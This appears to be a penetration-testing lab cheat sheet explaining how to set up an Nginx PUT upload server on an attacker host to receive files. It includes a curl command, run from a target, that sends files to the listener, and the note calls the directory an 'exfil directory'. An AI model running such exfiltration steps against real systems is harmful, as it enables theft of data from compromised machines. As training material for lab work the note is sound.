# Catching Files over HTTP/S — Nginx PUT Upload

Use Nginx over Apache for upload servers — no PHP module means no accidental webshell execution.

Create the upload directory and set ownership:

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Create `/etc/nginx/sites-available/upload.conf`:

```nginx
server {
    listen 9001;
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

Enable and start:

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx.service
```

Upload from target via curl PUT:

```bash
curl -T <FILE> http://<LHOST>:9001/SecretUploadDirectory/<OUTFILE>
```

> [!warning] Port 80 conflict on Pwnbox — something (websockify) already binds it. Use a non-standard port (9001) and remove the default Nginx config, or the service won't start. Check with `ss -lnpt | grep 80` if nginx fails to bind.

> [!tip] Verify directory listing is off by browsing to the upload path in a browser — Nginx disables it by default unlike Apache. If you see a file listing, your exfil directory is exposed.